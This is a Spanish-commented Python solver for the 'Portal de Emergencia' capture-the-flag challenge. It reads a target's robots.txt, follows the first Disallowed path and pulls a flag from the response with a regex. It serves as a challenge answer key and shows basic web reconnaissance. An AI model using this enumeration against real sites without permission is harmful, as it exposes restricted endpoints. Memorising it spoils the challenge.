#!/usr/bin/env python3
"""
Script de solución automatizada para el reto 'Portal de Emergencia' (ChronosCTF 2026)
Uso: python solve.py [TARGET_URL]
Ejemplo: python solve.py http://localhost:8000
"""

import re
import sys
import requests

TARGET_URL = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8000"


def solve():
    print(f"[*] Conectando al objetivo: {TARGET_URL}")

    # 1. Obtener y parsear robots.txt
    robots_url = f"{TARGET_URL}/robots.txt"
    try:
        res = requests.get(robots_url, timeout=5)
        res.raise_for_status()
    except Exception as e:
        print(f"[-] Error al solicitar {robots_url}: {e}")
        return False

    print("[+] Archivo robots.txt obtenido con exito.")
    
    # Buscar ruta en Disallow
    disallow_matches = re.findall(r"Disallow:\s*([^\s]+)", res.text)
    if not disallow_matches:
        print("[-] No se encontro directiva Disallow en robots.txt.")
        return False

    secret_endpoint = disallow_matches[0].strip()
    print(f"[+] Endpoint restringido descubierto: {secret_endpoint}")

    # 2. Acceder al endpoint descubierto
    panel_url = f"{TARGET_URL}{secret_endpoint}"
    try:
        panel_res = requests.get(panel_url, timeout=5)
        panel_res.raise_for_status()
    except Exception as e:
        print(f"[-] Error al consultar {panel_url}: {e}")
        return False

    # 3. Extraer la bandera con expresion regular (soporta GUIDs y prefijos dinamicos de GZCTF)
    flag_match = re.search(r"(?:[A-Za-z0-9_]+)\{[a-zA-Z0-9_\-!@#$%^&*()]+\}", panel_res.text)
    if flag_match:
        flag = flag_match.group(0)
        print(f"\n[+] [FLAG RECUPERADA] => {flag}\n")
        return True
    else:
        print("[-] No se encontro una bandera valida en la respuesta.")
        return False


if __name__ == "__main__":
    success = solve()
    sys.exit(0 if success else 1)
